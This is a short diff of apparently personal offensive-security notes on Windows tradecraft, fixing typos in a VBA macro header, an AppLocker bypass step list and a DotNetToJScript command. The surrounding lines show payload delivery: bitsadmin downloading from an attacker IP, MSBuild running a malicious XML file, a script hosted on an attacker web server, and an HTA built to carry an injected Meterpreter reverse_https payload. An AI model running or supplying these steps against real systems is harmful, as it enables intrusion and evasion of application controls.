@@ -673,7 +673,7 @@ bitsadmin /Transfer myJob http://<ip>/file.txt C:<path to save encoded file> &&c
 - run code as 32-bit
 
 ```vb
-SSub MyMacro()
+Sub MyMacro()
 
 Dim wsh As Object
 
@@ -914,7 +914,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\bad.xml
 	1. Uploaded ApplockerPowershellBypass to victim machine
 	2. copy ApplockerPowershellBypass to C:\\Windows\\Tasks
 	3. host xoml.ps1 on attacker web server
-	4. Run `C:\Windows\TasksApplockerPowershellBypass.exe`
+	4. Run `C:\Windows\Tasks\\ApplockerPowershellBypass.exe`
 	5. xml file now generated
 2. Add variable to script and generate new xml
 
@@ -1000,7 +1000,7 @@ mshta test.hta
 - inserted reverse_https metepreter payload
 - C# code to inject was taken from my InjectToJscript skeleton
 ```cmd
- .\DotNetToJScript\DotNetToJScript\bin\x64\Release\DotNetToJScript.exe InjectToJscriptCsWin32.dll --lang=Jscript --ver=2 -o Downloads\test.hta' -c InjectToJscriptCsWin32.Class1
+ .\DotNetToJScript\DotNetToJScript\bin\x64\Release\DotNetToJScript.exe InjectToJscriptCsWin32.dll --lang=Jscript --ver=2 -o Downloads\test.hta -c InjectToJscriptCsWin32.Class1
 ```
 - Better hta skeleton
 ```html
